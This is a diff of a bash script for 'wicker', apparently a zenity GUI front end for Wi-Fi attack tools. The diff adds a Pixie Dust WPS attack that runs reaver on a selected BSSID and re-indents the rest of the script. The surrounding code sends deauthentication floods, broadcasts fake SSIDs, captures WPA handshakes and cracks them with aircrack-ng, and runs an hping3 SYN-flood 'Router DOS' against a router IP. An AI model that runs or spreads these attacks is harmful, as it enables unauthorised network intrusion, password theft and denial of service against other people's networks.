@@ -70,7 +70,7 @@ echo "100" ; sleep 1
 --percentage=0 \
 --auto-close --no-cancel --width=300
 
-zenity --info --title="☠️wicker☠️" --text="👽Monitor mode turned on successfully" --width=300
+zenity --info --title="☠️wicker☠️" --text="👽Monitor mode turned on successfully" --width=400
 
 menu
 }
@@ -101,17 +101,49 @@ echo "100" ; sleep 2
 --percentage=0 \
 --auto-close --no-cancel --width=300
 
-zenity --info --title="☠️wicker☠️" --text="📡Monitor mode turned off..." --width=300
+zenity --info --title="☠️wicker☠️" --text="📡Monitor mode turned off..." --width=400
 
 menu
 }
 
 
+#pixie dust attack
+pixie () {
+	sudo xterm -T "All local wifi networks" -e "airodump-ng wlan0mon" &
+	loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
+	bssid=`zenity --list --title="✨Pixie dust" --text="Enter BSSID address" --cancel-label="Enter manually" --column="BSSID" $loot --width=500 --height=350`
+
+
+
+if [ -z $bssid ];
+then
+	bssid=$(zenity --entry --title="✨Pixie dust" --text="Enter target BSSID" --width=400 )
+fi
+
+if [ -z $bssid ];
+then
+	sudo killall xterm
+	zenity --error --width=200
+	menu
+fi
+
+channel=$(zenity --entry --title="✨Pixie dust" --text="enter channel number" --cancel-label="auto select")
+
+if [ -z $channel ];
+then
+	sudo xterm -T "✨Performing Pixie dust attack on ${bssid}" -e "sudo reaver -i wlan0mon -b $bssid -K 1 -vv"
+	menu
+else
+	sudo xterm -T "✨Performing Pixie dust attack on ${bssid}" -e "sudo reaver -i wlan0mon -b $bssid -c $channel -vv -K 1 -f"
+	menu
+fi
+}
+
 
 #check injection
 aireplay () {
-sudo aireplay-ng -9 wlan0mon
-menu
+	sudo aireplay-ng -9 wlan0mon
+	menu
 }
 
 
@@ -124,40 +156,40 @@ r=$(zenity --info --title '🛸airodump-ng' --text 'Scan single target🥷🏼 o
 
 if [ -z $r ];
 then
-menu
+	menu
 
 elif [ "$r" == "full" ];
 then
-reset;
-sudo airodump-ng wlan0mon
+	reset;
+	sudo airodump-ng wlan0mon
 
 
 else
-airodump_run
+	airodump_run
 fi
 }
 
 airodump_run () {
 if [ "$r" == "single" ];
 then
-loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
-bssid=`zenity --list --title="🛸airodump-ng" --text="Enter BSSID address" --cancel-label="Enter manually" --column="BSSID" $loot --width=500 --height=350`
+	loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
+	bssid=`zenity --list --title="🛸airodump-ng" --text="Enter BSSID address" --cancel-label="Enter manually" --column="BSSID" $loot --width=500 --height=350`
 
 fi
 
 if [ -z $bssid ];
 then
-bssid=$(zenity --entry --title="🛸airodump-ng" --text="Enter target BSSID" --width=400 )
-reset;
-sudo airodump-ng --bssid $bssid wlan0mon
+	bssid=$(zenity --entry --title="🛸airodump-ng" --text="Enter target BSSID" --width=400 )
+	reset;
+	sudo airodump-ng --bssid $bssid wlan0mon
 
 elif [ -z $bssid ];
 then
-zenity --error --title="☠️wicker☠️" --width=250
+	zenity --error --title="☠️wicker☠️" --width=250
 
 else
-reset;
-sudo airodump-ng --bssid $bssid wlan0mon
+	reset;
+	sudo airodump-ng --bssid $bssid wlan0mon
 
 fi
 }
@@ -168,39 +200,39 @@ fi
 kicks () {
 if [ "$r" == "s" ] || [ "$r" == "S" ];
 then
-loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
-bssid=`zenity --list --title="🕷Deauth wifi" --cancel-label="enter manually" --column="BSSID" $loot --width=500 --height=350`
+	loot=`iwlist wlan0mon scan | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'`
+	bssid=`zenity --list --title="🕷Deauth wifi" --cancel-label="enter manually" --column="BSSID" $loot --width=500 --height=350`
 fi
 
 if [ -z $bssid ]
 then
-sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+	sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
 
-bssid=$(zenity --entry --title="🕷Deauth wifi" --text="enter target BSSID" --width=500 )
+	bssid=$(zenity --entry --title="🕷Deauth wifi" --text="enter target BSSID" --width=500 )
 
-mac=$(zenity --entry --title="🕷Deauth wifi" --text="enter client MAC address" --width=500 )
+	mac=$(zenity --entry --title="🕷Deauth wifi" --text="enter client MAC address" --width=500 )
 
-num=$(zenity --entry --title="🕷Deauth wifi" --text="enter the number of deauth req (default: 200) " --width=300)
+	num=$(zenity --entry --title="🕷Deauth wifi" --text="enter the number of deauth req (default: 200) " --width=300)
 
-[ -z $num ] && num=200
+	[ -z $num ] && num=200
 
-sudo killall xterm 2>/dev/null
-sudo xterm -T "Sending deauth packets to the client" -e "aireplay-ng --deauth $num -a $bssid -D -c $mac wlan0mon"
-zenity --info --title="☠️wicker☠️" --text="Process complete\nSent $num deauth packets to the client $mac of $bssid" --width=400
-menu
-
+	sudo killall xterm 2>/dev/null
+	sudo xterm -T "Sending deauth packets to the client" -e "aireplay-ng --deauth $num -a $bssid -D -c $mac wlan0mon"
+    zenity --info --title="☠️wicker☠️" --text="Process complete\nSent $num deauth packets to the client $mac of $bssid" --width=400
+    menu
+    
 else
-mac=$(zenity --entry --title="🕷Deauth wifi" --text="enter client MAC address" --width=500 )
-
-num=$(zenity --entry --title="🕷Deauth wifi" --text="enter the number of deauth req (default: 200) " --width=300)
-
-[ -z $num ] && num=200
-sudo killall xterm 2>/dev/null
-sudo xterm -T "Sending deauth packets to the client" -e "sudo aireplay-ng --deauth $num -a $bssid -D -c $mac wlan0mon"
-zenity --info --title="☠️wicker☠️" --text="Process complete\nSent $num deauth packets to the client $mac of $bssid" --width=400
-menu
-
-fi
+    mac=$(zenity --entry --title="🕷Deauth wifi" --text="enter client MAC address" --width=500 )
+    
+    num=$(zenity --entry --title="🕷Deauth wifi" --text="enter the number of deauth req (default: 200) " --width=300)
+    
+    [ -z $num ] && num=200
+    sudo killall xterm 2>/dev/null
+    sudo xterm -T "Sending deauth packets to the client" -e "sudo aireplay-ng --deauth $num -a $bssid -D -c $mac wlan0mon"
+    zenity --info --title="☠️wicker☠️" --text="Process complete\nSent $num deauth packets to the client $mac of $bssid" --width=400
+    menu
+    
+    fi
 }
 
 #deauth wifi if full
@@ -211,29 +243,29 @@ bssid=`zenity --list --title="🕷Deauth wifi" --column="BSSID" --cancel-label="
 if [ -z $bssid ];
 then
 
-sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
-
-bssid=$(zenity --entry --title="🕷Deauth wifi" --text="enter target BSSID" --width=500)
-
-num=$(zenity --entry --title="🕷Deauth wifi" --text="enter the number of deauth req (default: 200)" --width=300)
-
-[ -z $num ] && num=200
-
-sudo killall xterm 2>/dev/null
-sudo xterm -T "Sending deauth packets to the client" -e "aireplay-ng --deauth $num -D -a $bssid wlan0mon"
-zenity --info --title="☠️wicker☠️" --text="Process complete\nSent $num deauth packets to $bssid" --width=400
-menu
+	sudo xterm -T "all local wifi networks | press (Ctrl-C) to stop me" -e "airodump-ng wlan0mon" &
+	
+	bssid=$(zenity --entry --title="🕷Deauth wifi" --text="enter target BSSID" --width=500)
+	
+	num=$(zenity --entry --title="🕷Deauth wifi" --text="enter the number of deauth req (default: 200)" --width=300)
+	
+	[ -z $num ] && num=200
+	
+	sudo killall xterm 2>/dev/null
+	sudo xterm -T "Sending deauth packets to the client" -e "aireplay-ng --deauth $num -D -a $bssid wlan0mon"
+	zenity --info --title="☠️wicker☠️" --text="Process complete\nSent $num deauth packets to $bssid" --width=400
+	menu
 
 else
-num=$(zenity --entry --title="🕷Deauth wifi" --text="enter the number of deauth req (default: 200)" --width=300)
-
-[ -z $num ] && num=200
-
-sudo killall xterm 2>/dev/null
-sudo xterm -T "Sending deauth packets to the client" -e "sudo aireplay-ng --deauth $num -D -a $bssid wlan0mon"
-zenity --info --title="☠️wicker☠️" --text="Process complete\nSent $num deauth packets to $bssid" --width=400
-menu
-
+	num=$(zenity --entry --title="🕷Deauth wifi" --text="enter the number of deauth req (default: 200)" --width=300)
+	
+	[ -z $num ] && num=200
+	
+	sudo killall xterm 2>/dev/null
+	sudo xterm -T "Sending deauth packets to the client" -e "sudo aireplay-ng --deauth $num -D -a $bssid wlan0mon"
+	zenity --info --title="☠️wicker☠️" --text="Process complete\nSent $num deauth packets to $bssid" --width=400
+	menu
+	
 fi
 }
 
@@ -246,7 +278,7 @@ channel=$(zenity --entry --title="🕸️Deauth wifi channel" --text="enter chan
 
 if [ -z $channel ];
 then
-zenity --error --width=250
+	zenity --error --width=250
 
 
 else
@@ -264,8 +296,8 @@ channel=$(zenity --entry --title="🕵🏻‍♂️Create multiple fake SSID" --
 
 if [ -z $channel ];
 then
-zenity --error --width=250
-menu
+	zenity --error --width=250
+	menu
 fi
 
 zenity --info --title="🕵🏻‍♂️Create multiple fake SSID" --text="Select a (.txt) file which cotains the SSID names" --width=300
@@ -274,8 +306,8 @@ txt=$(zenity --file-selection)
 
 if [ -z $txt ];
 then
-zenity --error --width=250
-menu
+	zenity --error --width=250
+	menu
 fi
 
 zenity --info --title="🕵🏻‍♂️Create multiple fake SSID" --text="Multiple SSID created successfully\nPress Ctrl+C to stop" --width=300 &
@@ -295,13 +327,13 @@ bssid=`zenity --list --title="🕸️Capture handshake" --cancel-label="Enter ma
 
 if [ -z "$bssid" ];
 then
-bssid=$(zenity --entry --title="🕸️Capture handshake" --text="Enter target BSSID" --width=400 )
+	bssid=$(zenity --entry --title="🕸️Capture handshake" --text="Enter target BSSID" --width=400 )
 fi
 
 if [ -z $bssid ];
 then
-zenity --error --width=250
-menu
+	zenity --error --width=250
+	menu
 fi
 
 xterm -T "Making a directory for (.cap) files" -e "rm -rf /tmp/WICKER-CAPS && mkdir /tmp/WICKER-CAPS"
@@ -344,33 +376,33 @@ pass=/usr/share/wicker/passwords.txt
 #check is there any handshake captued on not
 if aircrack-ng $file -w $pass | grep -q "EAPOL"
 then
-opinion=0
-`zenity --question --title= --text="🔐Handshake Captured\nFile:${file}\n🔓Try to crack it?" --width=300` && opinion=1 || opinion=0
-
-sudo killall xterm 2>/dev/null
-
-#if user select Yes
-[ "$opinion" == "1" ] && check_pass=`zenity --info --extra-button="Enter manually" --title="☠️wicker☠️" --text="💾Use default passlist?\n📄$pass\n 📄or select manually" --width=300`
-
-[ "$check_pass" == "Enter manually" ] && pass=`zenity --file-selection` && aircrack-ng $file --bssid $bssid -w $pass
-
-[ "$check_pass" != "Enter manually" ] && aircrack-ng $file --bssid $bssid -w $pass
-
-
-#if user select No
-[ "$opinion" == "0" ] && menu
-
-
+	opinion=0
+	`zenity --question --title= --text="🔐Handshake Captured\nFile:${file}\n🔓Try to crack it?" --width=300` && opinion=1 || opinion=0
+	
+	sudo killall xterm 2>/dev/null
+	
+	#if user select Yes
+	[ "$opinion" == "1" ] && check_pass=`zenity --info --extra-button="Enter manually" --title="☠️wicker☠️" --text="💾Use default passlist?\n📄$pass\n 📄or select manually" --width=300`
+	
+	[ "$check_pass" == "Enter manually" ] && pass=`zenity --file-selection` && aircrack-ng $file --bssid $bssid -w $pass
+	
+	[ "$check_pass" != "Enter manually" ] && aircrack-ng $file --bssid $bssid -w $pass
+	
+	
+	#if user select No
+	[ "$opinion" == "0" ] && menu
+	
+	
 #if handshake not captured
 else
-asK=0
-`zenity --question --title="☠️wicker☠️" --text="🟡Process complete...\n🔴No handshake captured\n🔵Try again?" --width=300` && asK=1 || asK=0
-
-sudo killall xterm 2>/dev/null
-file=""
-[ "$asK" == "1" ] && handshake
-[ "$asK" == "0" ] && menu
-
+	asK=0
+	`zenity --question --title="☠️wicker☠️" --text="🟡Process complete...\n🔴No handshake captured\n🔵Try again?" --width=300` && asK=1 || asK=0
+	
+	sudo killall xterm 2>/dev/null
+	file=""
+	[ "$asK" == "1" ] && handshake
+	[ "$asK" == "0" ] && menu
+	
 fi
 }
 
@@ -383,12 +415,12 @@ ip=$(zenity --entry --title="🚀Router DOS" --text="Enter the routers IP addres
 
 if [ -z "$ip" ]
 then
-zenity --error --text="⚠️Please enter a valid IP address" --width=250
-menu
+	zenity --error --text="⚠️Please enter a valid IP address" --width=250
+	menu
 
 else
-sudo xterm -T "Performing DOS on $ip | Press Ctrl+C to stop" -e  "hping3 -i u1 -S $ip"
-menu
+	sudo xterm -T "Performing DOS on $ip | Press Ctrl+C to stop" -e  "hping3 -i u1 -S $ip"
+	menu
 fi
 }
 
@@ -396,6 +428,7 @@ fi
 menu () {
 c=$(zenity --list --radiolist --title="☠️Network interface ${phy}️ ☠️" --text="Select an option" --column="Select" --column="Menu Item" \
 FALSE "Capture handshake" \
+FALSE "Pixie dust" \
 FALSE "Deauth wifi" \
 FALSE "Deauth channel" \
 FALSE "Create multiple fake SSID" \
@@ -404,61 +437,65 @@ FALSE "Router DOS" --cancel-label="exit" --ok-label="ok" --extra-button="check i
 
 if [ "$c" == "Turn on monitor mode" ];
 then
-on
+	on
 
 
 elif [ "$c" == "Turn off monitor mode" ];
 then
-off
+	off
 
+
+elif [ "$c" == "Pixie dust" ];
+then
+	pixie
 
 
 elif [ "$c" == "Run airodump-ng" ];
 then
-airodump_ask
+	airodump_ask
 
 
 elif [ "$c" == "Deauth wifi" ];
 then
-r=$(zenity --info --title '🕸️Deauth wifi' --text 'Attack on a clients MAC address or directly BSSID?' --extra-button Client --extra-button BSSID --ok-label back --width=400)
-
-[ -z $r ] && menu
-
-[ "$r" == "BSSID" ] && kickf
-
-
-[ "$r" == "Client" ] && kicks
-
-
+	r=$(zenity --info --title '🕸️Deauth wifi' --text 'Attack on a clients MAC address or directly BSSID?' --extra-button Client --extra-button BSSID --ok-label back --width=400)
+	
+	[ -z $r ] && menu
+	
+	[ "$r" == "BSSID" ] && kickf
+	
+	
+	[ "$r" == "Client" ] && kicks
+	
+	
 elif [ "$c" == "Deauth channel" ];
 then
-mdk
+	mdk
 
 elif [ "$c" == "Create multiple fake SSID" ];
 then
-mdk1
+	mdk1
 
 
 elif [ "$c" == "Capture handshake" ];
 then
-handshake
+	handshake
 
 
 elif [ "$c" == "Router DOS" ];
 then
-router
+	router
 
 
 
 elif [ "$c" == "check injection" ];
 then
-aireplay
+	aireplay
 
 
 
 elif [ "$c" == "" ];
 then
-exit 0
+	exit 0
 
 fi
 }
